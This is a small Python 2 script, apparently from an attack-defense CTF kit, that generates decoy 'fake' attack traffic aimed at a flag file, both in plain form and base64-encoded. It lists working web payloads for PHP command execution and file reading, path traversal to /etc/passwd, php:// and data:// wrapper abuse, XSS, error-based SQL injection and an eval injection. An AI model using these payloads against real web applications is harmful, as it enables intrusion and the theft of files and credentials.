# -*- coding: utf-8 -*-
'''
伪造常见攻击流量和base64以后的流量
'''
def get_fake_plain_payloads(flag_path):
    payloads = []
    payloads.append('system("cat %s");' % (flag_path))
    payloads.append('highlight_file("%s");' % (flag_path))
    payloads.append('echo file_get_contents("%s");' % (flag_path))
    payloads.append('var_dump(file_get_contents("%s"));' % (flag_path))
    payloads.append('print_r(file_get_contents("%s"));' % (flag_path))
    payloads.append('../../../../../../../../../var/lib/locate.db')
    payloads.append('../../../../../../../../../etc/passwd%00')
    payloads.append('php://filter/convert.base64-encode/resource=index.php')
    payloads.append('data://text/plain;base64,SSBsb3ZlIFBIUAo=')
    payloads.append('`><script>alert(0)</script>')
    payloads.append('<img src=&#04jav&#13;ascr&#09;ipt:al&#13;ert(0)>')
    payloads.append('<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>')
    payloads.append('<svg/onload=alert(2)></svg>')
    payloads.append('and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);')
    payloads.append('and extractvalue(1, concat(0x5c, (select user())));')
    payloads.append('page=md5&res="or @eval($_POST[test]( or"&test=phpinfo();')
    
    return payloads

def get_fake_base64_payloads(flag_path):
    payloads = get_fake_plain_payloads(flag_path)
    return [payload.encode("base64").replace("\n","") for payload in payloads]

def main():
    flag_path = "/home/web/flag/flag"
    print get_fake_plain_payloads(flag_path)
    print get_fake_base64_payloads(flag_path)

if __name__ == "__main__":
    main()
